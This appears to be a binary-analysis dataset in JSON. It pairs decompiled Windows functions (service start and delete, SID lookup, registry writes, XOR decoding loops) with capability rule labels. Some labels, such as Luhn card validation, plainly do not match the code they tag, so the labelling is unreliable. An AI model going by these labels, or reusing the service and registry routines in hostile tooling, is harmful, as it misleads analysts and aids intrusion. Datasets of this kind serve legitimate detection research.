    "00403250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032d3) overlaps instruction at (ram,0x004032cf)\n// \n// WARNING: Removing unreachable block (ram,0x0040328c)\n\nbool fcn.00403250(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    unkbyte10 extraout_ST0;\n    ulong uVar4;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack272 = 0;\n    uStack8 = 0x104;\n    puVar3 = &uStack271;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar4 = fcn.00403120(0x80000001, 0x410294, 0x4102c0, auStack12, &uStack272, &uStack8);\n    piVar2 = uVar4 >> 0x20;\n    iVar1 = uVar4;\n    if (iVar1 != 0) {\n        if ((-1 < iVar1) && (-1 >= iVar1)) {\n            *(iVar1 + -0x7ce92414) = extraout_ST0;\n            *piVar2 = *piVar2 + -0x7a72207c;\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar1 = func_0x004031d0(&uStack272);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 409
    },
    "004034a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034b4) overlaps instruction at (ram,0x004034b2)\n// \n\nuint __cdecl fcn.004034a0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t hSCManager;\n    uint uVar1;\n    char in_CH;\n    char *in_EDX;\n    int32_t unaff_EDI;\n    bool bVar2;\n    float10 extraout_ST0;\n    \n    *in_EDX = *in_EDX + in_CH;\n    bVar2 = *in_EDX < '\\0';\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    if ((!bVar2) && (bVar2)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n        hSCManager = hSCManager + 5;\n    }\n    fcn.004025a0(hSCManager, arg_8h);\n    uVar1 = fcn.00401070(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 262
    },
    "00403510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403510(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "004047a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047a0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004045a0(&var_68h, &var_4h, unaff_EDI, unaff_ESI);\n    fcn.004029e0(&var_68h, var_4h, 0x410514, 0xe000);\n    *arg_8h = 0x410514;\n    *arg_ch = 0xe000;\n    return;\n}\n",
        "token_count": 262
    },
    "00404c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404c10(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402da0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "004021b0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402251) overlaps instruction at (ram,0x0040224f)\n// \n// WARNING: Removing unreachable block (ram,0x00402251)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004021b0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    int32_t iVar6;\n    uchar *unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar7;\n    bool in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    char cVar8;\n    bool bVar9;\n    char cVar10;\n    float10 fVar11;\n    uchar auStack64 [4];\n    uint uStack60;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar uStack28;\n    uchar uStack27;\n    uint16_t uStack26;\n    uint uStack24;\n    uchar uStack20;\n    uchar uStack19;\n    ushort uStack18;\n    int32_t iStack12;\n    uchar *puVar12;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        iVar6 = unaff_EBX + 1;\n        if (in_CF || iVar6 == 0) {\n            if (unaff_EDI != unaff_ESI) {\n                iStack12 = 2;\n                puVar12 = unaff_EDI;\n                iVar5 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n                cVar10 = '\\0';\n                cVar8 = (iVar5 ^ iVar6) < 0;\n                uStack20 = 0x2f;\n                uStack19 = 0x22;\n                uStack18 = 0x40;\n                uStack40 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n                if ((cVar10 == cVar8) && (cVar10 != cVar8)) {\n                    iVar5 = iVar5 + -1;\n                    puVar7 = unaff_EDI | &stack0xfffffffc;\n                    unaff_EDI = puVar7 + 1;\n                    *puVar7 = uStack40;\n                }\n                uStack20 = SUB41(puVar12, 0);\n                uStack19 = puVar12 >> 8;\n                uStack18 = puVar12 >> 0x10;\n                uStack28 = 0x5b;\n                uStack27 = 0x22;\n                uStack26 = 0x40;\n                uStack24 = arg_8h;\n                sub.VERSION.dll_GetFileVersionInfoA();\n                puStack32 = &stack0xfffffff4;\n                uStack28 = SUB41(&stack0xfffffff0, 0);\n                uStack27 = &stack0xfffffff0 >> 8;\n                uStack26 = &stack0xfffffff0 >> 0x10;\n                uStack36 = 0x410004;\n                uStack44 = 0x402288;\n                sub.VERSION.dll_VerQueryValueA();\n                uVar2 = *(iStack12 + 0x10);\n                uStack26 = *(iStack12 + 0x10);\n                uStack24._2_2_ = *(iStack12 + 0x14);\n                uStack56 = uVar2 >> 0x10;\n                uStack28 = uVar2 >> 0x10;\n                uStack27 = uVar2 >> 0x18;\n                uStack24._0_2_ = *(iStack12 + 0x14) >> 0x10;\n                uStack44 = CONCAT12(uStack20, uStack24._2_2_) & 0xffff;\n                uStack52 = uStack26;\n                uStack48 = uStack24;\n                uStack60 = 0x4104d8;\n                iVar6 = (*_sym.imp.MSVCRT.dll_sprintf)();\n                bVar9 = &stack0xffffffd8 < 0;\n                if ((&stack0xffffffc0 < 0xffffffe8) && (0xffffffe7 < &stack0xffffffc0)) {\n                    bVar9 = iVar6 < 0;\n                }\n                uStack48 = 0x4022fc;\n                uStack44 = iVar5;\n                fVar11 = (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n                if ((!bVar9) && (bVar9)) {\n                    *(unaff_EDI + 0x1c) = fVar11;\n                    iVar5 = iVar5 + 5;\n                }\n                uStack52 = 0x402314;\n                uStack48 = iVar5;\n                (*_sym.imp.KERNEL32.dll_GlobalFree)();\n            }\n            return 1;\n        }\n        uVar3 = 9 < (in_EAX & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar3, in_EAX + uVar3 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - iVar6;\n    }\n    iStack12 = 0x80;\n    uStack20 = 0;\n    uStack19 = 0;\n    uStack18 = 0;\n    uStack24._0_2_ = 1;\n    uStack24._2_2_ = 0;\n    uStack28 = 0;\n    uStack27 = 0;\n    uStack26 = 0xc000;\n    puStack32 = arg_8h;\n    uStack36 = 0x4021e3;\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    return uVar4;\n}\n",
        "token_count": 1334
    },
    "00404ae0": {
        "rules": [
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b81) overlaps instruction at (ram,0x00404b7f)\n// \n// WARNING: Removing unreachable block (ram,0x00404b34)\n// WARNING: Removing unreachable block (ram,0x00404b41)\n\nuint __cdecl fcn.00404ae0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&var_218h, &var_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    var_31ch = &var_10h;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &var_218h, &var_114h, &var_4h, &var_31ch, &var_8h);\n    if (iVar1 != 0) {\n        if ((-1 < iVar1) && (-1 >= iVar1)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 395
    },
    "00401d50": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401da4)\n\nuint64_t __cdecl fcn.00401d50(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t extraout_EDX;\n    uint extraout_EDX_00;\n    uint *unaff_ESI;\n    bool in_OF;\n    uint64_t uVar4;\n    uint in_stack_0000000c;\n    uint in_stack_00000014;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_ESI = in_stack_00000014;\n        return CONCAT44(in_stack_0000000c, in_stack_00000014);\n    }\n    uVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    iVar2 = uVar4;\n    if (iVar2 == 0) {\n        return uVar4 & 0xffffffff00000000;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return extraout_EDX << 0x20;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return CONCAT44(extraout_EDX_00, 1);\n}\n",
        "token_count": 393
    },
    "004025a0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004025a0(uint hSCManager, uint lpServiceName)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uchar **ppuVar5;\n    uchar **ppuVar6;\n    bool in_ZF;\n    uchar *apuStack24 [2];\n    \n    puVar4 = &stack0xfffffffc;\n    ppuVar6 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar6 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar5 = apuStack24 + 1;\n        ppuVar6 = apuStack24 + 1;\n        cVar1 = '\\x10';\n        do {\n            puVar4 = puVar4 + -1;\n            ppuVar5 = ppuVar5 + -1;\n            *ppuVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n            apuStack24[1] = &stack0xfffffffc;\n        } while ('\\0' < cVar1);\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(*(ppuVar6 + 8), *(ppuVar6 + 0xc), 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar3 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar2);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return uVar3;\n}\n",
        "token_count": 351
    },
    "004029e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a26) overlaps instruction at (ram,0x00402a22)\n// \n\nvoid __cdecl fcn.004029e0(int32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t **ppiVar3;\n    uint16_t uVar4;\n    int32_t in_EDX;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    uint32_t unaff_EBX;\n    int32_t *piVar7;\n    unkuint3 Var8;\n    \n    ppiVar3 = NULL;\n    if (arg_14h != NULL) {\n        do {\n            piVar7 = unaff_EBX & 0xffffff00 | unaff_EBX - 0x12;\n            do {\n                uVar4 = in_EDX;\n                uVar6 = piVar7;\n                Var8 = piVar7 >> 8 & 0xffff00 | unaff_EBX >> 8;\n                uVar5 = *(ppiVar3 + arg_10h);\n                piVar7 = CONCAT31(Var8, uVar5);\n                if ((uVar6 < uVar4) || (uVar6 >= uVar4)) break;\n                ppiVar3 = ppiVar3 + -1;\n            } while (ppiVar3 != NULL && uVar6 == uVar4);\n            iVar1 = *arg_10h;\n            *arg_14h = arg_10h + 1;\n            uVar2 = *0x9750e2b5;\n            arg_10h = 0x8bb8ec44;\n            *piVar7 = *piVar7 << 0x12;\n            in_EDX = CONCAT44(iVar1 >> 0x1f, uVar2) % arg_ch;\n            uVar5 = uVar5 ^ *(in_EDX + arg_8h);\n            if ((uVar5 != 0) && (uVar5 == 0)) {\n                arg_10h = unaff_EBX & 0xffff | arg_8h << 0x10;\n            }\n            *(ppiVar3 + arg_10h) = uVar5;\n            ppiVar3 = ppiVar3 + 1;\n            unaff_EBX = CONCAT31(Var8, uVar5);\n        } while (ppiVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "00402b50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402bc3)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402b50(int32_t noname_0, int32_t noname_1, int32_t noname_2, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t in_stack_00000014;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % noname_1 + noname_0);\n            *(in_stack_00000014 + -1 + var_ch) = var_10h ^ *(var_8h + noname_2) ^ *((var_ch + -1) % noname_1 + noname_0)\n            ;\n            *(var_ch + in_stack_00000014) = var_10h ^ uVar1;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "00403630": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403630(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4101fc, 0x410240, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}